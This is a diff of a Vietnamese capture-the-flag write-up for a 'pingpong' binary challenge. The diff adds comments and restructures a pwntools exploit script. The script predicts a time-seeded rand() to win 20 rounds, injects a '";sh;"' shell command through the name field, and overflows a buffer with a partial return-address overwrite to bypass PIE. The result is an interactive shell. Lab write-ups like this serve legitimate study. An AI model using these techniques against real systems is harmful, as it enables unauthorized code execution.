@@ -36,12 +36,12 @@ PIE bật tức các địa chỉ binary là ngẫu nhiên.
     	    seed=libc.time(0)
     	    libc.srand(seed)
     
-    	    for i in range(20):
+    	    for i in range(20):			//thắng đủ 20 ván
     		    payload=libc.rand()%2
     		    if payload==0:
-    			    p.sendlineafter(b'right',b'l')
+    			    p.sendlineafter(b'right',b'l')	//0 thì chọn 'l'
     		    else:
-    			    p.sendlineafter(b'right',b'r')
+    			    p.sendlineafter(b'right',b'r')	//1 thì chọn 'r'
 
 ## Bypass PIE
 
@@ -83,36 +83,37 @@ Nhưng sau 1 lúc chạy thì thấy địa chỉ `printff` luôn có BYTE cuố
 	from ctypes import CDLL
 	libc =CDLL("libc.so.6")
 	context.binary=exe=ELF('./pingpong_patched',checksec=False)
-	while(1):
-		p=process(exe.path)
-	
-		p.recvuntil('my game?')
-		seed=libc.time(0)
-		libc.srand(seed)
-	
-		for i in range(20):
-			payload=libc.rand()%2
-			if payload==0:
-				p.sendlineafter(b'right',b'l')
-			else:
-				p.sendlineafter(b'right',b'r')
-	
-		p.sendlineafter(b'Your Name is:',b'";sh;"')
-	
-		payload=b'A'*32
-		payload+=p64(0)
-		payload+=b'\xae'+b'\x12'
-		p.sendafter(b'Feedback for the game:',payload)
-		p.recvuntil(b'Thanks for your feedback!')
-	
-		try:
-			p.sendline(b'echo ABCD')
-			p.recvuntil(b'ABCD')
-			break
-		except:
+	for i in range (-5,5):
+		while(1):
+			p=process(exe.path)
+		
+			p.recvuntil('my game?')
+			seed=libc.time(0)
+			libc.srand(seed)
+		
+			for i in range(20):
+				payload=libc.rand()%2
+				if payload==0:
+					p.sendlineafter(b'right',b'l')
+				else:
+					p.sendlineafter(b'right',b'r')
+		
+			p.sendlineafter(b'Your Name is:',b'";sh;"')
+		
+			payload=b'A'*32
+			payload+=p64(0)
+			payload+=b'\xae'+b'\x12'
+			p.sendafter(b'Feedback for the game:',payload)
+			p.recvuntil(b'Thanks for your feedback!')
+		
 			try:
-				p.close()
+				p.sendline(b'echo ABCD')
+				p.recvuntil(b'ABCD')
+				break
 			except:
-				pass
-				
-	p.interactive()
+				try:
+					p.close()
+				except:
+					pass
+					
+		p.interactive()
